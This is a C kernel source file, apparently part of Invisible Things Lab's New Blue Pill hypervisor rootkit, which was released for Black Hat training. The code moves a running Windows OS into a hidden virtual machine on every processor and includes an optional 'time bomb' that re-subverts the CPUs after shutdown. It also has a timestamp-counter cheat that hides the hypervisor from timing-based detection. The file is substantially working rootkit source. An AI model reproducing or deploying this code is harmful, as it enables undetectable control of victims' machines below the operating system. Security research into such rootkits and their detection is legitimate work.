/* 
 * Copyright holder: Invisible Things Lab
 * 
 * This software is protected by domestic and International
 * copyright laws. Any use (including publishing and
 * distribution) of this software requires a valid license
 * from the copyright holder.
 *
 * This software is provided for the educational use only
 * during the Black Hat training. This software should not
 * be used on production systems.
 *
 */

#include "hvm.h"



static KMUTEX	g_HvmMutex;

ULONG	g_uSubvertedCPUs=0;


PHVM_DEPENDENT	Hvm;


NTSTATUS NTAPI HvmCopyPhysicalToVirtual(PCPU Cpu,PVOID Destination,PHYSICAL_ADDRESS Source,ULONG uNumberOfPages)
{
	ULONG	i;
	NTSTATUS	Status;


	if (!Cpu || !Destination)
		return STATUS_INVALID_PARAMETER;

	if (!uNumberOfPages)
		return STATUS_SUCCESS;


	for (i=0;i<uNumberOfPages;i++,Source.QuadPart+=PAGE_SIZE) {
		if (!NT_SUCCESS(Status=CmPatchPTEPhysicalAddress(
			Cpu->SparePagePTE,
			Cpu->SparePage,
			Source))) {

			_KdPrint(("HvmCopyPhysicalToVirtual(): Failed to map PA 0x%X to VA 0x%p, status 0x%08hX\n",
				Source.QuadPart,
				Cpu->SparePage,
				Status));

			return Status;
		}

		RtlCopyMemory(&((PUCHAR)Destination)[i*PAGE_SIZE],Cpu->SparePage,PAGE_SIZE);
	}

	// restore old SparePage map
	CmPatchPTEPhysicalAddress(
		Cpu->SparePagePTE,
		Cpu->SparePage,
		Cpu->SparePagePA);

	return STATUS_SUCCESS;
}


NTSTATUS NTAPI HvmResumeGuest()
{

	_KdPrint(("HvmResumeGuest(): Processor #%d, irql %d\n",
		KeGetCurrentProcessorNumber(),
		KeGetCurrentIrql()));

	// irql will be lowered in the CmDeliverToProcessor()

	CmSti();

	return STATUS_SUCCESS;
}

#ifdef BLUE_CHICKEN
static VOID NTAPI HvmTimeBomb(PKDPC Dpc,PVOID DeferredContext,PVOID SystemArgument1,PVOID SystemArgument2)
{
	ULONG	uOldSubvertedCPUs,uRetries;

	_KdPrint(("HvmTimeBomb(): Processor #%d, irql %d\n",
		KeGetCurrentProcessorNumber(),
		KeGetCurrentIrql()));

	// irql is DPC already

	uRetries=10;

	do {
		// be sure that subversion will succeed
		uOldSubvertedCPUs=g_uSubvertedCPUs;
		CmSubvert(NULL);
		uRetries--;
	} while ((uOldSubvertedCPUs==g_uSubvertedCPUs) && uRetries);
	
}


VOID NTAPI HvmSetupTimeBomb(PVOID OriginalTrampoline,CCHAR ProcessorNumber)
{
	PKDPC	Dpc;
	PKTIMER	Timer;
	LARGE_INTEGER	Interval;


	KeSetSystemAffinityThread((KAFFINITY)(1<<ProcessorNumber));

	_KdPrint(("HvmSetupTimeBomb(): CPU#%d, irql %d\n",
		KeGetCurrentProcessorNumber(),
		KeGetCurrentIrql()));


	Dpc=ExAllocatePoolWithTag(NonPagedPool,sizeof(KDPC),ITL_TAG);
	if (!Dpc) {
		_KdPrint(("HvmSetupTimeBomb(): Failed to allocate KDPC\n"));
		return;
	}

	Timer=ExAllocatePoolWithTag(NonPagedPool,sizeof(KTIMER),ITL_TAG);
	if (!Timer) {
		_KdPrint(("HvmSetupTimeBomb(): Failed to allocate KTIMER\n"));
		return;
	}

	KeInitializeDpc(Dpc,HvmTimeBomb,NULL);
	KeSetTargetProcessorDpc(Dpc,ProcessorNumber);

	Interval.QuadPart=RELATIVE(MILLISECONDS(TIMEBOMB_COUNTDOWN));

	KeInitializeTimer(Timer);
	KeSetTimer(Timer,Interval,Dpc);

	KeRevertToUserAffinityThread();


	// call the real shutdown trampoline
	((VOID(*)())OriginalTrampoline)();

	// never returns
}
#endif


VOID NTAPI HvmEventCallback(PCPU Cpu,PGUEST_REGS GuestRegs,ULONG64 Ticks1)
{
	NTSTATUS	Status;
	LARGE_INTEGER	GuestGS_BASE;
	ULONG64	Ticks2;


	if (!Cpu || !GuestRegs)
		return;


//	GuestGS_BASE.QuadPart=MsrRead(MSR_GS_BASE);

	// setup our PCR
//	CmSetBluepillGS();

//	MsrWrite(MSR_GS_BASE,(ULONG64)Cpu);

	if (Hvm->ArchIsNestedEvent(Cpu,GuestRegs)) {

		// it's a event of a nested guest

		Hvm->ArchDispatchNestedEvent(Cpu,GuestRegs);

#ifdef SIMPLE_RDTSC_CHEATING
		Ticks2=RegGetTSC();

		Cpu->TotalTscOffset-=Ticks2-Ticks1+10000;
		Cpu->Svm.OriginalVmcb->tsc_offset=Cpu->TotalTscOffset;
#else
		Cpu->TotalTscOffset = 0;
		Cpu->Svm.OriginalVmcb->tsc_offset = 0;
			
#endif

//		MsrWrite(MSR_GS_BASE,GuestGS_BASE.QuadPart);
		return;
	}

	// it's an original event
	Hvm->ArchDispatchEvent(Cpu,GuestRegs);

#ifdef SIMPLE_RDTSC_CHEATING
	Ticks2=RegGetTSC();

	_KdPrint(("HvmEventCallback(): Tick diff %d\n",Ticks2-Ticks1));
	Cpu->TotalTscOffset-=Ticks2-Ticks1+11000;
	Cpu->Svm.OriginalVmcb->tsc_offset=Cpu->TotalTscOffset;
#else
	Cpu->TotalTscOffset = 0;
	Cpu->Svm.OriginalVmcb->tsc_offset = 0;
			
#endif

//	MsrWrite(MSR_GS_BASE,GuestGS_BASE.QuadPart);
	return;
}


static NTSTATUS HvmSetupGdt(PCPU Cpu)
{
	ULONG64	GuestTssBase;
	USHORT	GuestTssLimit;
	PSEGMENT_DESCRIPTOR	GuestTssDescriptor;


	if (!Cpu || !Cpu->GdtArea)
		return STATUS_INVALID_PARAMETER;

#if 0
	CmDumpGdt((PUCHAR)GetGdtBase(),(USHORT)GetGdtLimit());
#endif

	// set code and stack selectors the same with NT to simplify our unloading
	CmSetGdtEntry(
		Cpu->GdtArea,
		BP_GDT_LIMIT,
		BP_GDT64_CODE,
		0,
		0,
		LA_STANDARD | LA_DPL_0 | LA_CODE | LA_PRESENT | LA_READABLE,
		HA_LONG);

	// we don't want to have a separate segment for DS and ES. They will be equal to SS.
	CmSetGdtEntry(
		Cpu->GdtArea,
		BP_GDT_LIMIT,
		BP_GDT64_DATA,
		0,
		0xfffff,
		LA_STANDARD | LA_DPL_0 | LA_PRESENT | LA_WRITABLE,
		HA_GRANULARITY | HA_DB);


	GuestTssDescriptor=(PSEGMENT_DESCRIPTOR)(GetGdtBase()+GetTrSelector());


	GuestTssBase=GuestTssDescriptor->base0 | GuestTssDescriptor->base1<<16 | GuestTssDescriptor->base2<<24;
	GuestTssLimit=GuestTssDescriptor->limit0 | (GuestTssDescriptor->limit1attr1&0xf)<<16;
	if (GuestTssDescriptor->limit1attr1 & 0x80)
		// 4096-bit granularity is enabled for this segment, scale the limit
		GuestTssLimit<<=12;

	if (!(GuestTssDescriptor->attr0 & 0x10)) {
		GuestTssBase=(*(PULONG64)((PUCHAR)GuestTssDescriptor+4)) & 0xffffffffff000000;
		GuestTssBase|=(*(PULONG32)((PUCHAR)GuestTssDescriptor+2)) & 0x00ffffff;
	}


#if 0
	CmDumpTSS64((PTSS64)GuestTssBase,GuestTssLimit);
#endif

	MmMapGuestTSS64((PTSS64)GuestTssBase,GuestTssLimit);

	// don't need to reload TR - we use 0x40, as in xp/vista.
	CmSetGdtEntry(
		Cpu->GdtArea,
		BP_GDT_LIMIT,
		BP_GDT64_SYS_TSS,
		(PVOID)GuestTssBase,
		GuestTssLimit,//BP_TSS_LIMIT,
		LA_BTSS64 | LA_DPL_0 | LA_PRESENT,
		0);

	// so far, we have 3 GDT entries.
	// 0x10: CODE64		cpl0						CS
	// 0x18: DATA		dpl0						DS, ES, SS
	// 0x40: Busy TSS64, base is equal to NT TSS	TR

#if 0
	CmDumpGdt((PUCHAR)Cpu->GdtArea,BP_GDT_LIMIT);
#endif

	CmReloadGdtr(Cpu->GdtArea,BP_GDT_LIMIT);
	
	// set new DS and ES
	CmSetBluepillESDS();

	// we will use GS as our PCR pointer; GS base will be set to the Cpu in HvmEventCallback

	return STATUS_SUCCESS;
}


static NTSTATUS HvmSetupIdt(PCPU Cpu)
{
	UCHAR	i;


	if (!Cpu || !Cpu->IdtArea)
		return STATUS_INVALID_PARAMETER;

	for (i=0;i<32;i++)
		CmSetIdtEntry(
			Cpu->IdtArea,
			BP_IDT_LIMIT,
			i,//0x0d,							// #GP
			BP_GDT64_CODE,
			InGeneralProtection,
			0,
			LA_PRESENT | LA_DPL_0 | LA_INTGATE64);


	CmReloadIdtr(Cpu->IdtArea,BP_IDT_LIMIT);

	return STATUS_SUCCESS;
}

#ifdef VPC_STUFF
static NTSTATUS HvmSetupGuestShadowIdt(PCPU Cpu)
{
	ULONG	i;


	if (!Cpu || !Cpu->GuestIdtArea)
		return STATUS_INVALID_PARAMETER;

	for (i=0;i<256;i++)
		CmSetIdtEntry(
			Cpu->GuestIdtArea,
			BP_IDT_LIMIT,
			i,
			BP_GDT64_CODE,
			IntHandlers[i],
			0,
			LA_PRESENT | LA_DPL_0 | LA_INTGATE64);

	return STATUS_SUCCESS;
}
#endif


NTSTATUS NTAPI HvmSubvertCpu(PVOID GuestRsp)
{
	PCPU	Cpu;
	PVOID	HostKernelStackBase;
	NTSTATUS	Status;
	PHYSICAL_ADDRESS	HostStackPA;

#ifdef USE_2MB_PAGES
	ULONG64	VaDelta;
	PVOID	StackBase2MB;
	PCPU	Cpu2MBMap;
#endif



	_KdPrint(("HvmSubvertCpu(): Running on processor #%d\n",KeGetCurrentProcessorNumber()));


	if (!Hvm->ArchIsHvmImplemented()) {
		_KdPrint(("HvmSubvertCpu(): HVM extensions not implemented on this processor\n"));
		return STATUS_NOT_SUPPORTED;
	}

	HostKernelStackBase=MmAllocateContiguousPages(HOST_STACK_SIZE_IN_PAGES,&HostStackPA);
	if (!HostKernelStackBase) {
		_KdPrint(("HvmSubvertCpu(): Failed to allocate %d pages for the host stack\n",HOST_STACK_SIZE_IN_PAGES));
		return STATUS_INSUFFICIENT_RESOURCES;
	}


#ifdef USE_2MB_PAGES
	VaDelta=HostStackPA.QuadPart & 0x1fffff;
	HostStackPA.QuadPart=HostStackPA.QuadPart & ~0x1fffff;


	MmCreateMapping(HostStackPA,(PVOID)((((ULONG64)4+KeGetCurrentProcessorNumber())*0x200000)),TRUE);
	StackBase2MB=(PVOID)(VaDelta+(((ULONG64)4+KeGetCurrentProcessorNumber())*0x200000));
	Cpu2MBMap=(PCPU)((PCHAR)StackBase2MB+HOST_STACK_SIZE_IN_PAGES*PAGE_SIZE-8-sizeof(CPU));
#endif


	Cpu=(PCPU)((PCHAR)HostKernelStackBase+HOST_STACK_SIZE_IN_PAGES*PAGE_SIZE-8-sizeof(CPU));
	Cpu->HostStack=HostKernelStackBase;

	// for interrupt handlers which will address CPU through the FS
	Cpu->SelfPointer=Cpu;

	Cpu->ProcessorNumber=KeGetCurrentProcessorNumber();

	InitializeListHead(&Cpu->GeneralTrapsList);
	InitializeListHead(&Cpu->MsrTrapsList);
	InitializeListHead(&Cpu->IoTrapsList);



	Cpu->GdtArea=MmAllocatePages(BYTES_TO_PAGES(BP_GDT_LIMIT),NULL);

	if (!Cpu->GdtArea) {
		_KdPrint(("HvmSubvertCpu(): Failed to allocate memory for GDT\n"));
		return STATUS_INSUFFICIENT_RESOURCES;
	}


	Cpu->IdtArea=MmAllocatePages(BYTES_TO_PAGES(BP_IDT_LIMIT),NULL);
	if (!Cpu->IdtArea) {
		_KdPrint(("HvmSubvertCpu(): Failed to allocate memory for IDT\n"));
		return STATUS_INSUFFICIENT_RESOURCES;
	}

#ifdef VPC_STUFF
	Cpu->GuestIdtArea=MmAllocatePages(BYTES_TO_PAGES(BP_IDT_LIMIT),NULL);
	if (!Cpu->GuestIdtArea) {
		_KdPrint(("HvmSubvertCpu(): Failed to allocate memory for guest IDT\n"));
		return STATUS_INSUFFICIENT_RESOURCES;
	}
#endif


	// allocate a 4k page. Fail the init if we can't allocate such page
	// (e.g. all allocations reside on 2mb pages).

	Cpu->SparePage=MmAllocatePages(1,&Cpu->SparePagePA);
	if (!Cpu->SparePage) {
		_KdPrint(("HvmSubvertCpu(): Failed to allocate 1 page for the dummy page (DPA_CONTIGUOUS)\n"));
		return STATUS_UNSUCCESSFUL;
	}

	// this is valid only for host page tables, as this VA may point into 2mb page in the guest.
	Cpu->SparePagePTE=(PULONG64)((((ULONG64)(Cpu->SparePage)>>9) & 0x7ffffffff8)+PT_BASE);



	Status=Hvm->ArchRegisterTraps(Cpu);
	if (!NT_SUCCESS(Status)) {
		_KdPrint(("HvmSubvertCpu(): Failed to register NewBluePill traps, status 0x%08hX\n",Status));
		return STATUS_UNSUCCESSFUL;
	}


	Status=Hvm->ArchInitialize(Cpu,CmSlipIntoMatrix,GuestRsp);
	if (!NT_SUCCESS(Status)) {
		_KdPrint(("HvmSubvertCpu(): ArchInitialize() failed with status 0x%08hX\n",Status));
		return Status;
	}

	InterlockedIncrement(&g_uSubvertedCPUs);


#ifdef VPC_STUFF
	HvmSetupGuestShadowIdt(Cpu);
#endif

	// no API calls allowed below this point: we have overloaded GDTR and selectors
	HvmSetupGdt(Cpu);
	HvmSetupIdt(Cpu);

	// load host ITLB
//	HvmVmExitCallback(NULL,NULL);
	// load host DTLB
//	g_i=*(PULONG)HvmVmExitCallback;


#ifdef USE_2MB_PAGES
	Status=Hvm->ArchVirtualize(Cpu2MBMap);
#else
	Status=Hvm->ArchVirtualize(Cpu);
#endif

	// never reached

	InterlockedDecrement(&g_uSubvertedCPUs);

	return Status;
}


static NTSTATUS NTAPI HvmLiberateCpu(PVOID Param)
{

#ifndef ENABLE_HYPERCALLS

	return STATUS_NOT_SUPPORTED;

#else

	NTSTATUS	Status;
	ULONG64	Efer;
	PCPU	Cpu;

	// called at DPC level

	if (KeGetCurrentIrql()!=DISPATCH_LEVEL)
		return STATUS_UNSUCCESSFUL;


	Efer=MsrRead(MSR_EFER);

	_KdPrint(("HvmLiberateCpu(): Reading MSR_EFER on entry: 0x%X\n",Efer));

	if (!NT_SUCCESS(Status=HcMakeHypercall(NBP_HYPERCALL_UNLOAD,0,NULL))) {
		_KdPrint(("HvmLiberateCpu(): HcMakeHypercall() failed on processor #%d, status 0x%08hX\n",
			KeGetCurrentProcessorNumber(),
			Status));

		return Status;
	}

	Efer=MsrRead(MSR_EFER);
	_KdPrint(("HvmLiberateCpu(): Reading MSR_EFER on exit: 0x%X\n",Efer));

	return STATUS_SUCCESS;
#endif
}


NTSTATUS NTAPI HvmSpitOutBluepill()
{

#ifndef ENABLE_HYPERCALLS

	return STATUS_NOT_SUPPORTED;

#else

	CCHAR	cProcessorNumber;
	NTSTATUS	Status,CallbackStatus;


	_KdPrint(("HvmSpitOutBluepill(): Going to liberate %d processor%s\n",
		KeNumberProcessors,
		KeNumberProcessors==1 ? "" : "s"));

	KeWaitForSingleObject(&g_HvmMutex,Executive,KernelMode,FALSE,NULL);

	for (cProcessorNumber=0;cProcessorNumber<KeNumberProcessors;cProcessorNumber++) {

		_KdPrint(("HvmSpitOutBluepill(): Liberating processor #%d\n",cProcessorNumber));

		Status=CmDeliverToProcessor(cProcessorNumber,HvmLiberateCpu,NULL,&CallbackStatus);

		if (!NT_SUCCESS(Status)) {
			_KdPrint(("HvmSpitOutBluepill(): CmDeliverToProcessor() failed with status 0x%08hX\n",Status));
		}

		if (!NT_SUCCESS(CallbackStatus)) {
			_KdPrint(("HvmSpitOutBluepill(): HvmLiberateCpu() failed with status 0x%08hX\n",CallbackStatus));
		}
	}

	_KdPrint(("HvmSpitOutBluepill(): Finished at irql %d\n",KeGetCurrentIrql()));

	KeReleaseMutex(&g_HvmMutex,FALSE);
	return STATUS_SUCCESS;
#endif
}


NTSTATUS NTAPI HvmSwallowBluepill()
{
	CCHAR	cProcessorNumber;
	NTSTATUS	Status,CallbackStatus;


	_KdPrint(("HvmSwallowBluepill(): Going to subvert %d processor%s\n",
		KeNumberProcessors,
		KeNumberProcessors==1 ? "" : "s"));

	KeWaitForSingleObject(&g_HvmMutex,Executive,KernelMode,FALSE,NULL);

	for (cProcessorNumber=0;cProcessorNumber<KeNumberProcessors;cProcessorNumber++) {

		_KdPrint(("HvmSwallowBluepill(): Subverting processor #%d\n",cProcessorNumber));

		Status=CmDeliverToProcessor(cProcessorNumber,CmSubvert,NULL,&CallbackStatus);

		if (!NT_SUCCESS(Status)) {
			_KdPrint(("HvmSwallowBluepill(): CmDeliverToProcessor() failed with status 0x%08hX\n",Status));
			KeReleaseMutex(&g_HvmMutex,FALSE);

			HvmSpitOutBluepill();

			return Status;
		}

		if (!NT_SUCCESS(CallbackStatus)) {
			_KdPrint(("HvmSwallowBluepill(): HvmSubvertCpu() failed with status 0x%08hX\n",CallbackStatus));
			KeReleaseMutex(&g_HvmMutex,FALSE);

			HvmSpitOutBluepill();

			return CallbackStatus;
		}
	}

	KeReleaseMutex(&g_HvmMutex,FALSE);

	if (KeNumberProcessors!=g_uSubvertedCPUs) {
		HvmSpitOutBluepill();
		return STATUS_UNSUCCESSFUL;
	}


	return STATUS_SUCCESS;
}


NTSTATUS NTAPI HvmInit()
{

	Hvm=&Svm;

	if (!Hvm->ArchIsHvmImplemented()) {
		_KdPrint(("HvmInit(): %s is not supported\n",
			Hvm->Architecture==ARCH_SVM ? "SVM" : 
				Hvm->Architecture==ARCH_VMX ? "VMX" : "???"));
		return STATUS_NOT_SUPPORTED;
	} else {
		_KdPrint(("HvmInit(): Running on %s\n",
			Hvm->Architecture==ARCH_SVM ? "SVM" : 
				Hvm->Architecture==ARCH_VMX ? "VMX" : "???"));
	}


	KeInitializeMutex(&g_HvmMutex,0);

	return STATUS_SUCCESS;
}
